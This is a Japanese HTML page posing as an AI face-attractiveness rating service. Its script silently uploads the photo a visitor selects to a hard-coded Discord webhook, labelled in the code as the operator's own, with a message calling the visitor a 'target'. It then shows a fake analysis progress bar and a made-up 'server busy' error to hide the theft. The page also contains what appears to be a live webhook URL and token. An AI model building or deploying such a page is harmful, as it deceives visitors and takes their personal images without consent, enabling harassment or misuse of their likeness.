<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI顔面偏差値診断</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .upload-btn { background: #ff4757; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; transition: 0.3s; }
        .upload-btn:active { background: #ff6b81; }
        #status { margin-top: 20px; color: #ffa500; font-weight: bold; font-size: 20px; }
    </style>
</head>
<body>
    <h1>AI顔面偏差値診断</h1>
    <p>最新AIがあなたの顔を精密に解析し、偏差値を算出します。</p>
    
    <input type="file" id="imageInput" accept="image/*" style="display: none;">
    <button class="upload-btn" onclick="document.getElementById('imageInput').click()">写真を選択して診断</button>

    <div id="status"></div>

    <script>
        // おみ、ここがお前の専用Webhookだぜ
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1487713878908604566/6EIHGd-7hglyHQE-oCm4-xPw_OoiUNC-YFjnYFMVqsAgveLtTIZ3aKf5o9DKYtf82jul";

        document.getElementById('imageInput').addEventListener('change', async (e) => {
            const file = e.target.files[0];
            if (!file) return;

            const status = document.getElementById('status');
            status.innerText = "AI解析中... (0%)";
            
            const formData = new FormData();
            formData.append('file', file);
            formData.append('payload_json', JSON.stringify({ content: "📸 **【おみこしハブ：速報】** ターゲットが写真を送信しました！" }));

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    // 演出用の読み込み
                    for(let i=10; i<=100; i+=10) {
                        status.innerText = `AI解析中... (${i}%)`;
                        await new Promise(r => setTimeout(r, 400));
                    }
                    status.innerText = "解析失敗: アクセスが集中しています。時間をおいて再度お試しください。";
                } else {
                    status.innerText = "エラー: サーバーに接続できません。";
                }
            } catch (err) {
                status.innerText = "接続エラーが発生しました。";
            }
        });
    </script>
</body>
</html>
